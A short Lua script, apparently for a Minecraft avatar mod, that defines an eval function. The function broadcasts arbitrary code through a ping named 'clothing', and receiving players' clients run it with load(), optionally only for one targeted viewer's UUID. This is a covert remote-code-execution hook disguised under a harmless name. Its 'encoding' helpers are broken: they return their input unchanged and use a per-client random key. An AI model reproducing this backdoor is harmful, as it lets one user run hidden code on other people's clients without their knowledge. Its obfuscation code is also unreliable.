
local shitVal = math.random(1, 255)

local function shit(i) return ((shitVal + i) + shitVal) end

local function ncode(str)
	local output = ""
	for i = 1, #str do
		output = output..string.char((str:byte(i) + shit(i)) % 256)
	end
	return str
end

local function dcode(str)
	local output = ""
	for i = 1, #str do
		output = output..string.char((str:byte(i) - shit(i)) % 256)
	end
	return str
end

---@param code string
function eval(code,uuid)
	pings.clothing(ncode(code),ncode(uuid))
end

function pings.clothing(code,uuid)
	local allow = true
	if uuid then
		allow = client:getViewer():getUUID() == dcode(uuid)
	end
	if allow then
		load("return "..dcode(code),"run",_ENV)()
	end
end